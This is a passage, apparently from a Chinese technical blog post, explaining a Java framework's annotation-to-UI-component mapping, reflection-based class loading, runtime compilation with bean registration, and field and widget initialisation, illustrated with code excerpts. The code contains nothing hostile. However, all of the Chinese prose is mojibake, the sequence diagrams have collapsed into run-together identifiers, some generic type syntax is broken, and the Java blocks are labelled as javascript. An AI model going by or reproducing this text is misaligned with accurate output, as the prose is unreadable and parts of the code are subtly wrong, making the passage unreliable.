<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ£€æŸ¥å¤šç§ç±»å‹ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒä¸åŒçš„Javaç±»å‹</li>
<li>æ”¯æŒæ³›å‹ç±»å‹</li>
<li>æ”¯æŒè‡ªå®šä¹‰ç±»å‹</li>
</ul>
</li>
</ol>
<h3 data-id="heading-38">åŸåˆ™6ï¼šç»„ä»¶æ˜ å°„åŸåˆ™</h3>
<p>ç»„ä»¶æ˜ å°„åŸåˆ™æ˜¯æŒ‡å°†ç»„ä»¶ç±»å‹æ˜ å°„åˆ°å…·ä½“çš„UIç»„ä»¶ç±»ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a8c3883281184a8bb21c5990c82effe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=8reYmzBQCuWdC5vdk4JGTJooJvU%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-title class_">Class</span>&lt;<span class="hljs-title class_">UIComponent</span>&gt; <span class="hljs-title function_">getComponent</span>(<span class="hljs-params">ComponentType componentType</span>) {
    <span class="hljs-title class_">Class</span>&lt;<span class="hljs-title class_">UIComponent</span>&gt; componentClass = widgetComponentMap.<span class="hljs-title function_">get</span>(componentType);
    <span class="hljs-keyword">return</span> componentClass;
}

<span class="hljs-keyword">void</span> <span class="hljs-title function_">initClass</span>(<span class="hljs-params">Class beanClazz</span>) {
    <span class="hljs-title class_">CustomClass</span> customClass = (<span class="hljs-title class_">CustomClass</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">CustomClass</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">CustomBean</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(beanClazz) &amp;&amp; customClass != <span class="hljs-literal">null</span>) {
        <span class="hljs-title class_">AnnotationType</span> ann = (<span class="hljs-title class_">AnnotationType</span>) beanClazz.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">AnnotationType</span>.<span class="hljs-property">class</span>);
        viewTypeAnnMap.<span class="hljs-title function_">put</span>(ann.<span class="hljs-title function_">clazz</span>(), customClass);
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">UIComponent</span>.<span class="hljs-property">class</span>.<span class="hljs-title function_">isAssignableFrom</span>(customClass.<span class="hljs-title function_">clazz</span>())) {
            <span class="hljs-keyword">switch</span> (customClass.<span class="hljs-title function_">viewType</span>()) {
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMPONENT</span>:
                    <span class="hljs-title class_">WidgetMetaMap</span>.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), beanClazz);
                    widgetComponentMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), customClass.<span class="hljs-title function_">clazz</span>());
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }
                    <span class="hljs-keyword">break</span>;
                <span class="hljs-keyword">case</span> <span class="hljs-attr">COMBOBOX</span>:
                    <span class="hljs-keyword">if</span> (ann != <span class="hljs-literal">null</span>) {
                        <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                            comboBoxAnnMap.<span class="hljs-title function_">put</span>(inputType, ann.<span class="hljs-title function_">clazz</span>());
                            comboBoxComponentMap.<span class="hljs-title function_">put</span>(inputType, customClass.<span class="hljs-title function_">clazz</span>());
                        }
                        widgetClass.<span class="hljs-title function_">add</span>(ann.<span class="hljs-title function_">clazz</span>());
                        widgetAnnMap.<span class="hljs-title function_">put</span>(customClass.<span class="hljs-title function_">componentType</span>(), ann.<span class="hljs-title function_">clazz</span>());
                    }

                    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">ComboInputType</span> inputType : customClass.<span class="hljs-title function_">inputType</span>()) {
                        comboBoxBeanMap.<span class="hljs-title function_">put</span>(inputType, beanClazz);
                    }
                    <span class="hljs-keyword">break</span>;
            }
        }
    }
}
</code></pre>
<h4 data-id="heading-39">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ç»„ä»¶æ˜ å°„ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒç»„ä»¶æ‰©å±•</li>
<li>æä¾›ç»„ä»¶æŸ¥æ‰¾æœºåˆ¶</li>
<li>å®ç°ç»„ä»¶å·¥å‚æ¨¡å¼</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†COMPONENTå’ŒCOMBOBOXï¼Ÿ</strong>
<ul>
<li>COMPONENTï¼šç‹¬ç«‹ç»„ä»¶</li>
<li>COMBOBOXï¼šä¸‹æ‹‰ç»„ä»¶</li>
<li>ä¸åŒçš„ç»„ä»¶ç±»å‹æœ‰ä¸åŒçš„æ¸²æŸ“é€»è¾‘</li>
</ul>
</li>
</ol>
<h2 data-id="heading-40">æ„å»ºç¼–è¯‘ä¸åˆ—ç»“æ„æŠ½è±¡å»ºæ¨¡</h2>
<h3 data-id="heading-41">1. æ„å»ºé˜¶æ®µ</h3>
<p>æ„å»ºé˜¶æ®µæ˜¯æŒ‡å°†Javaç±»åŠ è½½åˆ°å†…å­˜ä¸­ï¼Œå¹¶åˆ›å»ºBridgeClasså®ä¾‹ã€‚</p>
<p>C2UConfigFactoryReflectionBridgeClassBridgeClassLoaderUserC2UConfigFactoryReflectionBridgeClassBridgeClassLoaderUseråŠ è½½ç±»è·å–ç±»ä¿¡æ¯è¿”å›ç±»ä¿¡æ¯åˆ›å»ºBridgeClassè·å–å­—æ®µå’Œæ–¹æ³•è¿”å›å­—æ®µå’Œæ–¹æ³•åˆå§‹åŒ–å­—æ®µè¿”å›å­—æ®µé…ç½®åˆå§‹åŒ–æ–¹æ³•è¿”å›æ–¹æ³•é…ç½®è¿”å›BridgeClasså®ä¾‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span>(<span class="hljs-params">Class ctClass</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">ctClass</span> = ctClass;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtFields</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();

    <span class="hljs-comment">// è·å–æ‰€æœ‰å­—æ®µ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getDeclaredFields</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(field.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : ctClass.<span class="hljs-title function_">getFields</span>()) {
        <span class="hljs-keyword">if</span> (field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">startsWith</span>(<span class="hljs-string">"this$"</span>)
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(field.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !field.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtFields.<span class="hljs-title function_">add</span>(field);
        }
    }

    <span class="hljs-comment">// è·å–æ‰€æœ‰æ–¹æ³•</span>
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">allCtMethods</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">String</span>&gt; methodNames = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getDeclaredMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
            methodNames.<span class="hljs-title function_">add</span>(method.<span class="hljs-title function_">getName</span>());
        }
    }

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Method</span> method : ctClass.<span class="hljs-title function_">getMethods</span>()) {
        <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Modifier</span>.<span class="hljs-title function_">isStatic</span>(method.<span class="hljs-title function_">getModifiers</span>())
                &amp;&amp; !methodNames.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getName</span>())
                &amp;&amp; !skipClassSet.<span class="hljs-title function_">contains</span>(method.<span class="hljs-title function_">getDeclaringClass</span>())
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(ctClass)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Enum</span>.<span class="hljs-property">class</span>)
                &amp;&amp; !method.<span class="hljs-title function_">getDeclaringClass</span>().<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">Object</span>.<span class="hljs-property">class</span>)) {
            allCtMethods.<span class="hljs-title function_">add</span>(method);
        }
    }

    <span class="hljs-comment">// è§£æç±»çº§åˆ«æ³¨è§£</span>
    <span class="hljs-title class_">MethodChinaName</span> chinaName = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">MethodChinaName</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (chinaName != <span class="hljs-literal">null</span>) {
        <span class="hljs-variable language_">this</span>.<span class="hljs-property">methodChinaBean</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">MethodChinaMeta</span>(chinaName);
    }

    <span class="hljs-title class_">RepositoryAnnotation</span> repository = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">RepositoryAnnotation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (repository != <span class="hljs-literal">null</span>) {
        repositoryBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">RepositoryMeta</span>(repository);
    }

    <span class="hljs-title class_">Aggregation</span> aggregationClass = <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(ctClass, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>);
    <span class="hljs-keyword">if</span> (aggregationClass != <span class="hljs-literal">null</span>) {
        aggregationBean = <span class="hljs-keyword">new</span> <span class="hljs-title class_">AggregationBean</span>(aggregationClass);
    }

    <span class="hljs-comment">// ...</span>
}
</code></pre>
<h4 data-id="heading-42">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ„å»ºé˜¶æ®µï¼Ÿ</strong>
<ul>
<li>å°†ç±»ä¿¡æ¯åŠ è½½åˆ°å†…å­˜</li>
<li>åˆ›å»ºç»Ÿä¸€çš„æ•°æ®ç»“æ„</li>
<li>ä¸ºåç»­å¤„ç†åšå‡†å¤‡</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦ç¼“å­˜å­—æ®µå’Œæ–¹æ³•ï¼Ÿ</strong>
<ul>
<li>é¿å…é‡å¤åå°„</li>
<li>æé«˜æ€§èƒ½</li>
<li>æ”¯æŒæ‡’åŠ è½½</li>
</ul>
</li>
</ol>
<h3 data-id="heading-43">2. ç¼–è¯‘é˜¶æ®µ</h3>
<p>ç¼–è¯‘é˜¶æ®µæ˜¯æŒ‡åŠ¨æ€ç¼–è¯‘Javaç±»ï¼Œå¹¶æ³¨å†Œåˆ°Springå®¹å™¨ã€‚</p>
<p>SpringContainerClassLoaderJavaCompilerBridgeClassUserSpringContainerClassLoaderJavaCompilerBridgeClassUseråŠ¨æ€ç¼–è¯‘ç¼–è¯‘Javaæºç åŠ è½½ç¼–è¯‘åçš„ç±»æ³¨å†ŒBeanæ³¨å†ŒæˆåŠŸè¿”å›Classå¯¹è±¡</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">void</span> <span class="hljs-title function_">compileJavaSrc</span>(<span class="hljs-params">List&lt;JavaSrcMeta&gt; srcBeanList, <span class="hljs-built_in">String</span> projectName, ChromeProxy chrome</span>) {
    D2CGenerator javaGen = D2CGenerator.<span class="hljs-title function_">getInstance</span>(projectName);
    <span class="hljs-keyword">try</span> {
        javaGen.<span class="hljs-title function_">compileJavaSrc</span>(srcBeanList, chrome);
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">JDSException</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }

    <span class="hljs-title class_">Set</span>&lt;<span class="hljs-title class_">Class</span>?&gt;&gt; classSet = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>&lt;&gt;();
    <span class="hljs-comment">// æ›´æ–°æœåŠ¡æ³¨å†Œ</span>
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">JavaSrcMeta</span> srcBean : srcBeanList) {
        <span class="hljs-title class_">Class</span> clazz = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            clazz = <span class="hljs-title class_">ClassUtility</span>.<span class="hljs-title function_">loadClass</span>(srcBean.<span class="hljs-title function_">getClassName</span>());
            classSet.<span class="hljs-title function_">add</span>(clazz);
            <span class="hljs-title function_">registerClass</span>(clazz);
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">ClassNotFoundException</span> e) {
            log.<span class="hljs-title function_">warn</span>(e.<span class="hljs-title function_">getMessage</span>());
        }
    }
    <span class="hljs-title class_">APIConfigFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">dyReload</span>(classSet);
}

public <span class="hljs-keyword">void</span> <span class="hljs-title function_">registerClass</span>(<span class="hljs-params">Class clazz</span>) {
    <span class="hljs-keyword">if</span> (clazz != <span class="hljs-literal">null</span>) {
        <span class="hljs-keyword">if</span> (<span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(clazz, <span class="hljs-title class_">Aggregation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>
                || <span class="hljs-title class_">AnnotationUtil</span>.<span class="hljs-title function_">getClassAnnotation</span>(clazz, <span class="hljs-title class_">EsbBeanAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
            <span class="hljs-title class_">EsbBeanFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">registerService</span>(clazz);
        }
        <span class="hljs-title class_">String</span> className = clazz.<span class="hljs-title function_">getName</span>();
        <span class="hljs-keyword">try</span> {
            classManager.<span class="hljs-title function_">clear</span>(className);
            <span class="hljs-title class_">APIConfigFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">reload</span>(className);
            <span class="hljs-title class_">APIFactory</span>.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">loadApiConfig</span>(className);
            <span class="hljs-title class_">ClassUtility</span>.<span class="hljs-title function_">loadClass</span>(className);

        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Exception</span> e) {
        }
    }
}
</code></pre>
<h4 data-id="heading-44">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åŠ¨æ€ç¼–è¯‘ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒè¿è¡Œæ—¶ç”Ÿæˆä»£ç </li>
<li>æ”¯æŒçƒ­éƒ¨ç½²</li>
<li>æé«˜å¼€å‘æ•ˆç‡</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦æ³¨å†Œåˆ°Springå®¹å™¨ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒä¾èµ–æ³¨å…¥</li>
<li>æ”¯æŒAOP</li>
<li>æ”¯æŒäº‹åŠ¡ç®¡ç†</li>
</ul>
</li>
</ol>
<h3 data-id="heading-45">3. åˆ—ç»“æ„æŠ½è±¡é˜¶æ®µ</h3>
<p>åˆ—ç»“æ„æŠ½è±¡é˜¶æ®µæ˜¯æŒ‡æå–å­—æ®µåˆ—è¡¨ï¼Œç¡®å®šå­—æ®µç±»å‹ï¼Œå»ºç«‹å­—æ®µæ˜ å°„å…³ç³»ã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ea62ab1855f644ee95b5dc30afbe09f5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=UIxH2SPmQDp2AZvNuwuiCN3Ue%2FM%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">void</span> <span class="hljs-title function_">initField</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; fieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">BridgeField</span>&gt; disableFieldMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">CustomAnnotation</span>&gt; customAnnotationMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">LinkedHashMap</span>&lt;&gt;();
    int index = <span class="hljs-number">0</span>;

    <span class="hljs-comment">// å¹¶è¡Œå¤„ç†å­—æ®µåˆå§‹åŒ–</span>
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">Callable</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt;&gt; fieldTasks = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();
    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">Field</span> field : allCtFields) {
        fieldTasks.<span class="hljs-title function_">add</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InitFieldTask</span>&lt;&gt;(field, index, <span class="hljs-variable language_">this</span>));
        index++;
    }
    <span class="hljs-title class_">List</span>&lt;<span class="hljs-title class_">BridgeFieldConfig</span>&gt; fields = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">invokFieldTasks</span>(className, fieldTasks);

    <span class="hljs-keyword">for</span> (<span class="hljs-title class_">BridgeFieldConfig</span> fieldInfo : fields) {
        <span class="hljs-title class_">Field</span> field = fieldInfo.<span class="hljs-property">field</span>;
        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isSerialize</span>()) {
            fieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            esdFieldMap.<span class="hljs-title function_">put</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>(), fieldInfo);
            fieldNameList.<span class="hljs-title function_">add</span>(fieldInfo.<span class="hljs-title function_">getFieldName</span>());
        } <span class="hljs-keyword">else</span> {
            disableFieldMap.<span class="hljs-title function_">put</span>(field.<span class="hljs-title function_">getName</span>().<span class="hljs-title function_">toLowerCase</span>(), fieldInfo);
            disableFieldList.<span class="hljs-title function_">add</span>(fieldInfo);
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isUid</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">uid</span> = field.<span class="hljs-title function_">getName</span>();
        }

        <span class="hljs-keyword">if</span> (fieldInfo.<span class="hljs-title function_">isCaptionField</span>()) {
            <span class="hljs-variable language_">this</span>.<span class="hljs-property">captionField</span> = fieldInfo;
        }
    }
}
</code></pre>
<h4 data-id="heading-46">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åˆ—ç»“æ„æŠ½è±¡ï¼Ÿ</strong>
<ul>
<li>ç»Ÿä¸€å­—æ®µçš„æ•°æ®ç»“æ„</li>
<li>æ”¯æŒå­—æ®µçš„æ‰¹é‡å¤„ç†</li>
<li>æé«˜å­—æ®µå¤„ç†çš„æ•ˆç‡</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦åŒºåˆ†fieldMapå’ŒdisableFieldMapï¼Ÿ</strong>
<ul>
<li>fieldMapï¼šéœ€è¦æ˜¾ç¤ºçš„å­—æ®µ</li>
<li>disableFieldMapï¼šä¸éœ€è¦æ˜¾ç¤ºçš„å­—æ®µ</li>
<li>åˆ†ç¦»å…³æ³¨ç‚¹ï¼Œæé«˜å¤„ç†æ•ˆç‡</li>
</ul>
</li>
</ol>
<h3 data-id="heading-47">4. å»ºæ¨¡é˜¶æ®µ</h3>
<p>å»ºæ¨¡é˜¶æ®µæ˜¯æŒ‡åˆ›å»ºUIç»„ä»¶ï¼Œå»ºç«‹ç»„ä»¶å±‚æ¬¡ç»“æ„ï¼Œé…ç½®ç»„ä»¶å±æ€§ï¼Œç»‘å®šæ•°æ®æºã€‚</p>
<p>â€‹</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/772ea3a5a34041e0a496988440769eae~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgT25lQ29kZUNO:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770734116&amp;x-signature=mC%2Bhpx58NVXtt1ekda3Y%2BvNA0OI%3D" alt="è¯·åœ¨æ­¤æ·»åŠ å›¾ç‰‡æè¿°" loading="lazy"/></p>
<p>â€‹</p>
<p><strong>æ ¸å¿ƒä»£ç åˆ†æï¼š</strong></p>
<pre><code class="hljs language-javascript" lang="javascript">public <span class="hljs-keyword">void</span> <span class="hljs-title function_">initWidget</span>(<span class="hljs-params"/>) {
    <span class="hljs-title class_">Class</span>? clazz = <span class="hljs-literal">null</span>;
    <span class="hljs-title class_">ComponentType</span>[] skipComs = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ComponentType</span>[]{<span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">TOOLBAR</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">APICALLER</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">COMBOINPUT</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>, <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>};
    <span class="hljs-title class_">Class</span>&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt;[] skipAnnotations = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">ComboInputAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ToolBarMenu</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">ListAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">InputAnnotation</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>};

    <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span> || <span class="hljs-title class_">Arrays</span>.<span class="hljs-title function_">asList</span>(skipComs).<span class="hljs-title function_">contains</span>(componentType)) {
        <span class="hljs-title class_">CustomClass</span> customClass = C2UConfigFactory.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getWidgetCustomAnnotation</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>().<span class="hljs-title function_">toArray</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Annotation</span>[]{}));
        <span class="hljs-keyword">if</span> (customClass != <span class="hljs-literal">null</span>) {
            componentType = customClass.<span class="hljs-title function_">componentType</span>();
        }

        <span class="hljs-keyword">if</span> (componentType == <span class="hljs-literal">null</span> || componentType.<span class="hljs-title function_">equals</span>(<span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>)) {
            <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">InputAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">INPUT</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">ListAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">LIST</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">ToolBarMenu</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">TOOLBAR</span>;
            } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAnnotation</span>(<span class="hljs-title class_">APIEventAnnotation</span>.<span class="hljs-property">class</span>) != <span class="hljs-literal">null</span>) {
                componentType = <span class="hljs-title class_">ComponentType</span>.<span class="hljs-property">APICALLER</span>;
            }
        }
    }

    <span class="hljs-keyword">try</span> {
        clazz = C2UConfigFactory.<span class="hljs-title function_">getInstance</span>().<span class="hljs-title function_">getDefaultWidgetClass</span>(componentType);
        <span class="hljs-title class_">Constructor</span> constructor = <span class="hljs-literal">null</span>;
        <span class="hljs-keyword">try</span> {
            constructor = clazz.<span class="hljs-title function_">getConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">BridgeField</span>.<span class="hljs-property">class</span>, <span class="hljs-title class_">Set</span>.<span class="hljs-property">class</span>});
            widgetConfig = (M) constructor.<span class="hljs-title function_">newInstance</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>()});
        } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">NoSuchMethodException</span> e) {
            constructor = clazz.<span class="hljs-title function_">getConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]{<span class="hljs-title class_">Set</span>.<span class="hljs-property">class</span>});
            widgetConfig = (M) constructor.<span class="hljs-title function_">newInstance</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]{<span class="hljs-variable language_">this</span>.<span class="hljs-title function_">getAllAnnotation</span>()});
        }
    } <span class="hljs-keyword">catch</span> (<span class="hljs-title class_">Throwable</span> e) {
        e.<span class="hljs-title function_">printStackTrace</span>();
    }
}
</code></pre>
<h4 data-id="heading-48">è®¾è®¡æ€è€ƒï¼š</h4>
<ol>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦å»ºæ¨¡é˜¶æ®µï¼Ÿ</strong>
<ul>
<li>åˆ›å»ºUIç»„ä»¶å®ä¾‹</li>
<li>å»ºç«‹ç»„ä»¶å±‚æ¬¡ç»“æ„</li>
<li>é…ç½®ç»„ä»¶å±æ€§</li>
</ul>
</li>
<li><strong>ä¸ºä»€ä¹ˆéœ€è¦å¤šç§æ„é€ å‡½æ•°ï¼Ÿ</strong>
<ul>
<li>æ”¯æŒä¸åŒçš„åˆå§‹åŒ–æ–¹å¼</li>
<li>æ”¯æŒä¸åŒçš„å‚æ•°ç»„åˆ</li>
<li>æé«˜çµæ´»æ€§</li>
</ul>
</li>
